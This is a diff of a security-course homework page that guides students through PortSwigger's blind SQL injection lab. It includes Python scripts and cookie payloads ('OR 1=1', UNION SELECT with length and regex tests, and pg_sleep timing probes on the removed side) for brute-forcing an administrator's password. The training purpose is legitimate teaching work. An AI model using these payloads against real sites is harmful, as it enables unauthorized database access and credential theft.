@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
 <meta name="theme-color" content="#4F7DC9">
 <meta charset="UTF-8">
-<title>3.2: HW2 (time-delays-info-retrieval)</title>
+<title>3.2: HW2 (conditional-responses)</title>
 <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
 <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
 <link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
@@ -14,31 +14,49 @@
 </head>
 <body>
 <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
-<google-codelab codelab-gaid="" id="W3.2_hw2" title="3.2: HW2 (time-delays-info-retrieval)" environment="web" feedback-link="https://docs.google.com/document/d/1ThDR9JO4BjpVNuh1-glba6u1GTbmXy-5hERnSAHBXko">
-<google-codelab-step label="sql-injection/blind" duration="2">
-<h2 is-upgraded><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval" target="_blank">time-delays-info-retrieval</a></h2>
-<p>In this homework, you will be solving a Blind SQL injection level using a Python script that implements a binary search. To begin with, in your course repository, create the directory below and <code>cd</code> into it.</p>
+<google-codelab codelab-gaid="" id="W3.2_hw2" title="3.2: HW2 (conditional-responses)" environment="web" feedback-link="https://docs.google.com/document/d/1YE5pFki1XsbEktNpVbHKMN9odgJW7xcvLjX0CHwh-mA">
+<google-codelab-step label="sql-injection/blind" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses" target="_blank">conditional-responses</a></h2>
+<p>In this level, the web application uses a tracking cookie in order to identify a particular user visiting the site. To perform the tracking, the backend server stores information associated with the cookie into a SQL database. When performing queries using this cookie, however, the cookie value is not sanitized and is vulnerable to SQL injection. While the results of the query aren&#39;t exposed through the web application, a Blind SQL injection attack is still possible.</p>
+<h3 is-upgraded>Identify tracking cookie</h3>
+<p>Visit the level site in an Incognito window. When one visits the site for the first time, a session cookie and a tracking cookie are set and the banner only has &#34;Home&#34; and &#34;Login&#34; links in its banner. Click &#34;Reload&#34; in the browser and see that a &#34;Welcome back&#34; string appears in the UI. Because the initial request does not have the tracking cookie set, the &#34;Welcome back&#34; string does not appear. However, the first request installs a cookie which is sent in subsequent requests. Revisiting the site with the cookie set causes a &#34;Welcome back&#34; message to appear.</p>
+<p class="image-container"><img style="width:624px" src="img/82dedfbf743ef7f0.png"></p>
+</google-codelab-step>
+<google-codelab-step label="Vulnerability" duration="5">
+<p>To demonstrate the vulnerability in the browser, bring up Developer Tools and reload the site, then find the &#34;Application&#34; tab, and find the name of the cookie used to perform the tracking..</p>
+<p class="image-container"><img style="width:478px" src="img/1a4807d52a533188.png"></p>
+<p>Right-click the &#34;Value&#34; field of the cookie and edit it to append a single-quote after the value. Reload the page and see that the &#34;Welcome back&#34; string disappears.</p>
+<p class="image-container"><img style="width:473px" src="img/2fef27f76c5239fb.png"></p>
+<p>We don&#39;t yet know if this broke the syntax of the SQL statement, but to test whether it has, append the always-true condition in SQL: <code>' OR 1=1 --</code> to the end of the original cookie value. Reload the page and see that the &#34;Welcome back&#34; string appears. We have successfully broken SQL syntax, inserted an always-true condition, and tricked the site into thinking we have a valid cookie.</p>
+<p class="image-container"><img style="width:560px" src="img/e3c662dfcbc8d4b6.png"></p>
+<p>We will be using the presence of the &#34;Welcome back&#34; string on the homepage to determine if particular queries were successful in our attack in order to expose the password of the <code>administrator</code> user for the site.</p>
+</google-codelab-step>
+<google-codelab-step label="Python environment" duration="2">
+<p>You will be writing your attack in Python using the <code>requests</code> and <code>BeautifulSoup</code> packages.</p>
+<ul>
+<li>In your course repository, create the directory below and <code>cd</code> into it.</li>
+</ul>
 <pre><code>cd &lt;path_to_your_git_repository&gt;
 mkdir hw2
 cd hw2</code></pre>
-<p>Then, create a <code>requirements.txt</code> file that contains the <code>requests</code> package.</p>
-<pre><code>requests</code></pre>
-<p>Set up your environment in the directory</p>
+<ul>
+<li>Create a file called <code>requirements.txt</code> with the following inside. The file contains the Python packages we want to install.</li>
+</ul>
+<pre><code>requests
+bs4</code></pre>
+<ul>
+<li>Set up your environment in the directory</li>
+</ul>
 <pre><code>virtualenv -p python3 env
 source env/bin/activate
 pip install -r requirements.txt</code></pre>
-<p>Then, visit the lab and launch the level.</p>
-</google-codelab-step>
-<google-codelab-step label="Vulnerability" duration="10">
-<p>In the level, the web application uses a tracking cookie in order to identify a particular user visiting the site. To perform the tracking, the backend server inserts the cookie value into a backend SQL database. If the SQL code for inserting and looking up cookie values in the backend SQL database is vulnerable to SQL injection, then crafting a cookie that contains syntax that can break the vulnerable insertion code may allow an adversary to execute SQL commands, if the cookie&#39;s value is not sanitized. While the results of the query might not be exposed directly through the web application, a Blind SQL injection attack is still possible.</p>
-<h3 is-upgraded>Identify tracking cookie</h3>
-<p>Using an Incognito window, bring up the browser&#39;s Developer Tools and visit the level site. When one visits the site for the first time, a session cookie and a tracking cookie are set. Find the &#34;Application&#34; tab and view the cookies for the page in order to see the names and values of the cookies that are used to perform session identification and user tracking. Make a note of the name of each cookie.</p>
-<p class="image-container"><img style="width:478px" src="img/1a4807d52a533188.png"></p>
 </google-codelab-step>
 <google-codelab-step label="Initial program" duration="5">
-<p>While we don&#39;t know the actual query being performed, we can demonstrate injection by inserting a single-quote in the value of our cookie followed by SQL code that can indicate we&#39;ve performed a successful injection. Create the Python script below in a file called <code>hw2.py</code> in your <code>hw2</code> directory, replacing the &lt;<code>FMI</code>&gt; with the name of the tracking cookie. The program implements a function that accesses the level <code>site</code> specified using a cookie that contains a specified string. Timing code is then pulled from the response to measure how long the request took to execute and returned from the function.</p>
+<p>While we don&#39;t know the actual query being performed, we can demonstrate injection by inserting either a single-quote or double-quote in the value of our cookie. In the Python script below, create a file called <code>hw2.py</code> in your <code>hw2</code> directory, replacing the <code><fmi></fmi></code> (Fill me in) with the tracking cookie name. The program implements a function <code>try_query</code> that accesses the level <code>site</code> specified using a cookie that contains a specified <code>query</code> string. The function URL-encodes the query and then attaches it to the tracking cookie. If the cookie results in a &#34;valid&#34; query, the &#34;Welcome back&#34; string is returned.</p>
 <h3 is-upgraded>hw2.py</h3>
 <pre><code>import requests, sys
+from bs4 import BeautifulSoup
+import urllib.parse
 
 site = sys.argv[1]
 if &#39;https://&#39; in site:
@@ -46,22 +64,22 @@ if &#39;https://&#39; in site:
 
 url = f&#39;https://{site}/&#39;
 
-def test_cookie(cookie_string):
-  cookie_data = {
-    &#39;&lt;FMI&gt;&#39; : cookie_string
-  }
-  resp = requests.get(url,cookies=cookie_data)
-  return(resp.elapsed.total_seconds())
+def try_query(query):
+    print(f&#39;Query: {query}&#39;)
+    mycookies = {&#39;&lt;FMI&gt;&#39;: urllib.parse.quote_plus(query) }
+    resp = requests.get(url, cookies=mycookies)
+    soup = BeautifulSoup(resp.text, &#39;html.parser&#39;)
+    if soup.find(&#39;div&#39;, text=&#39;Welcome back!&#39;):
+        return True
+    else:
+        return False
 
-elapsed = test_cookie(&#34;x&#34;)
-print(f&#34;&#34;&#34;Request &#34;x&#34; returned in {elapsed}&#34;&#34;&#34;)
-
-elapsed = test_cookie(&#34;x&#39; || pg_sleep(3) -- &#34;)
-print(f&#34;&#34;&#34;Request &#34;x&#39; || pg_sleep -- &#34; returned in {elapsed}&#34;&#34;&#34;)</code></pre>
-<p>The program tests 2 query strings. Both queries use a bogus cookie value <code>x</code>. However, the second cookie attempts to break syntax by inserting a single quote to run a PostgreSQL function that sleeps for 3 seconds. </p>
+print(try_query(&#34;&#34;&#34;x&#39; OR 1=1 --&#34;&#34;&#34;))
+print(try_query(&#34;&#34;&#34;x&#34; OR 1=1 --&#34;&#34;&#34;))</code></pre>
+<p>The program tests 2 query strings. Both queries use a bogus cookie value <code>x</code>, then attempt to break syntax with either a single-quote or double-quote to implement the always-true disjunction (<code>OR 1=1</code>). The one that breaks syntax results in the SQL statement succeeding.</p>
 </google-codelab-step>
 <google-codelab-step label="Run the program" duration="5">
-<p>Run the code and validate that you have leveraged the BlindSQL injection vulnerability to perform the sleep. </p>
+<p>Run the program on your site to show which query succeeds.</p>
 <pre>python hw2.py &lt;Level_URL&gt;
 ...</pre>
 <p>Then, add, commit and push this initial script and its <code>requirements.txt</code> into your repository</p>
@@ -70,19 +88,28 @@ git commit -m &#34;Initial script&#34;
 git push</code></pre>
 </google-codelab-step>
 <google-codelab-step label="Find the password length" duration="2">
-<p>Once we have a successful SQL injection, we can then use it to test arbitrary conditions in the backed database. One test we can do is to find the length of the <code>administrator</code>&#39;s password. Consider the Python snippet below that breaks syntax, then injects a URL-encoded semicolon (<code>%3B</code>) to end the initial SQL statement and run a subsequent PostgreSQL command. The subsequent command performs the PostgreSQL version of an <code>if</code> statement via &#34;<code>select case</code>&#34;. Assuming user information is kept in a table called <code>users</code> and that the table contains columns for the <code>username</code> and <code>password</code> for each user, then to find the length of the <code>administrator</code>&#39;s password we can brute-force a range of lengths to find it. </p>
-<pre><code>for num in range(32):
-  if test_cookie(f&#34;&#34;&#34;x&#39;%3Bselect case when (username = &#39;administrator&#39; and length(password) = {num}) then pg_sleep(3) else pg_sleep(0) end from users--&#34;&#34;&#34;) &gt; 3:
-    print(f&#39;Length is {num}&#39;)
-    break</code></pre>
-<p>Modify your Python program to return the length of the <code>administrator</code>&#39;s password. Note that you may need to restart the level if it has timed out before running your script. Once you have successfully modified the script to find the length of the password, add, commit and push it into your repository. </p>
+<p>Once we have a successful SQL injection, we can then use it to test arbitrary conditions in the backed database. One test we can do is to find the length of the <code>administrator</code>&#39;s password. Consider the Python snippet below that performs a UNION on the users table to test the length of the <code>administrator</code>&#39;s password. The program also includes timing code which is used to determine the execution time.</p>
+<pre><code>import time
+
+begin_time = time.perf_counter()
+num = 1
+while True:
+    query = f&#34;x&#39; UNION SELECT username FROM users WHERE username=&#39;administrator&#39; AND length(password)={num}--&#34;
+    print(f&#39;Trying length {num}&#39;)
+    if try_query(query) == False:
+        num = num + 1
+    else:
+        break
+
+print(f&#34;Password length is {num}&#34;)
+print(f&#34;Time elapsed is {time.perf_counter()-begin_time}&#34;)</code></pre>
+<p>Modify your Python program to return the length of the <code>administrator</code>&#39;s password. Then, add, commit and push it into your repository.</p>
 <pre><code>git add .
 git commit -m &#34;Find length&#34;
 git push</code></pre>
-<p>Note that the code above uses a linear search of all lengths. A more efficient approach would be to perform a binary search using &lt; and &gt; tests for the length. While we will be doing such a binary search for the password value itself, you may find implementing a binary search for the password length a good warm up exercise to do before continuing.</p>
 </google-codelab-step>
 <google-codelab-step label="SQL and regular expressions" duration="5">
-<p>PostgreSQL databases support a range of query operators. We can use these operators in the injection to reveal arbitrary information contained within the database without directly observing the results of the injected query. For example, PostgreSQL supports the <code>~</code> operator as well as the <code>SIMILAR TO</code> operator for regular expression matching. Such expressions allow one to specify matches on string patterns in a programmatic way. </p>
+<p>SQL databases support powerful query operators. We can use these operators in the injection to reveal arbitrary information contained within the database without directly observing the results of the injected query. For example, PostgreSQL supports the <code>~</code> operator as well as the <code>SIMILAR TO</code> operator for regular expression matching. Such expressions allow one to specify matches on string patterns in a programmatic way. </p>
 <p>We will start with the <code>~</code> operator for <a href="http://marvin.cs.uidaho.edu/Handouts/regex.html" target="_blank">POSIX regular expressions</a>. Key to a program that uses this operator will be the <code>^</code> operator for denoting the beginning of a string and the <code>$</code> operator for denoting the end of it. Consider the case where the <code>administrator</code>&#39;s password is &#39;<code>abc</code>&#39;. If we replace the length check from the previous program with various regular expressions, we can then glean incremental information on the password itself. </p>
 <pre><code>password ~ &#39;b&#39;       // True since password contains b in it
 password ~ &#39;^a&#39;      // True since password begins with a
@@ -98,13 +125,13 @@ password SIMILAR TO &#39;abc&#39;    // True password is abc</code></pre>
 <p>More documentation on the SIMILAR TO operator can be found <a href="https://www.postgresql.org/docs/9.3/functions-matching.html" target="_blank">here</a></p>
 </google-codelab-step>
 <google-codelab-step label="Linear search" duration="5">
-<p>Choose one of either the <code>~</code> or the <code>SIMILAR TO</code> operators or the <code>substring()</code> function and modify your <code>hw2.py</code> program to perform a brute-force attack on the administrator&#39;s password that reveals the password one character at a time using it.</p>
+<p>Using either the <code>~</code> or the <code>SIMILAR TO</code> operators, modify your <code>hw2.py</code> program to perform a brute-force attack on the administrator&#39;s password that reveals the password one character at a time.</p>
 <p>Ensure that your program does the following:</p>
 <ul>
 <li>Only searches the valid character set (e.g. <code>string.ascii_lowercase + string.digits</code> or <code>abcdefghijklmnopqrstuvwxyz0123456789</code>)</li>
 <li>Incrementally outputs the password as each character is determined</li>
 <li>Works on passwords of any length via the use of exact matches after each character round (e.g. <code>password ~ '^password-candidate$'</code> or <code>password SIMILAR TO 'password-candidate'</code>)</li>
-<li>Calculates the execution time of the attack</li>
+<li>Calculates the execution time of the attack using the timing code previously given</li>
 <li>Emits the password and exits once found</li>
 </ul>
 <pre>python hw2.py
@@ -137,15 +164,23 @@ password SIMILAR TO &#39;a[a-z]%&#39;// True password begins with a and a lowerc
 password SIMILAR TO &#39;[0-9]%&#39; // False password does not begin with a digit</code></pre>
 </google-codelab-step>
 <google-codelab-step label="Binary search" duration="2">
-<p>The range syntax allows us to split the search space of characters allowing us to speed up the execution of our attack. Take the first character as an example. Creating a <code>charset</code> to be all the candidate characters used in the <code>password</code>, we can calculate the middle of the set (<code>mid</code>)</p>
+<p>The range syntax allows us to split the search space of characters allowing us to speed up the execution of our attack.</p>
+<h2 is-upgraded>Splitting example</h2>
+<p>Consider the Python snippets below that use the <code>try_query</code> function to query each half of the character set the password is created from. Based on the password found previously in your linear search program, ensure that they return the appropriate result.</p>
 <pre><code>charset = string.ascii_lowercase + string.digits
-mid = len(charset) // 2</code></pre>
-<p>We can then perform two queries to check which half of the charset the first character resides in via the regular expressions below: </p>
-<pre><code>password ~ &#39;^[{charset[:mid]}]&#39; –-
-password ~ &#39;^[{charset[mid:]}]&#39; --</code></pre>
-<p>Likewise, we can do the same with the <code>SIMILAR TO</code> operator.</p>
-<pre><code>password SIMILAR TO &#39;[{charset[:mid]}]%&#39; --
-password SIMILAR TO &#39;[{charset[mid:]}]%&#39; -- </code></pre>
+
+# Integer midpoint of character set
+mid = len(charset) // 2
+
+# Determine which half of the character set the first letter
+#   belongs to using the ~ operator
+print(try_query(f&#34;&#34;&#34;x&#39; UNION SELECT username from users where username = &#39;administrator&#39; and password ~ &#39;^[{charset[:mid]}]&#39; --&#34;&#34;&#34;))
+print(try_query(f&#34;&#34;&#34;x&#39; UNION SELECT username from users where username = &#39;administrator&#39; and password ~ &#39;^[{charset[mid:]}]&#39; --&#34;&#34;&#34;))
+
+# Determine which half of the character set the first letter
+#   belongs to using the SIMILAR TO operator
+print(try_query(f&#34;&#34;&#34;x&#39; UNION SELECT username from users where username = &#39;administrator&#39; and password SIMILAR TO &#39;[{charset[:mid]}]%&#39; --&#34;&#34;&#34;))
+print(try_query(f&#34;&#34;&#34;x&#39; UNION SELECT username from users where username = &#39;administrator&#39; and password SIMILAR TO &#39;[{charset[mid:]}]%&#39; --&#34;&#34;&#34;))</code></pre>
 <h2 is-upgraded>Algorithm</h2>
 <p>When used in a program, it is unnecessary to check both halves of the search space as done above. If the character is found in one half, it can&#39;t be in the other. If a character is not found in one half, it must be in the other. A search algorithm would take the range that has the character in it, split it in half, and run a subsequent query on one of the halves to continue the search Note that if one picks a half of a range that does not match, the next query will split the <em>opposite</em> half for the next round of querying.</p>
 <p>For example, for finding the first character (say &#39;<code>m</code>&#39;), a scenario might have the following rounds of querying on the <code>'abcdefghijklmnopqrstuvwxyz0123456789'</code> (assuming the <code>~</code> operator is used)</p>
@@ -170,7 +205,7 @@ password SIMILAR TO &#39;[{charset[mid:]}]%&#39; -- </code></pre>
 <li>Only searches the valid character set (e.g. <code>string.ascii_lowercase + string.digits</code> or <code>abcdefghijklmnopqrstuvwxyz0123456789</code>)</li>
 <li>Incrementally outputs the password as each character is determined</li>
 <li>Works on passwords of any length via the use of exact matches after each character round (e.g. <code>password ~ '^password-candidate$'</code> or <code>password SIMILAR TO 'password-candidate'</code>)</li>
-<li>Calculates the execution time of the attack</li>
+<li>Calculates the execution time of the attack using the timing code previously given</li>
 <li>Emits the password and exits once found</li>
 </ul>
 <p>In addition, for this version, your program must:</p>
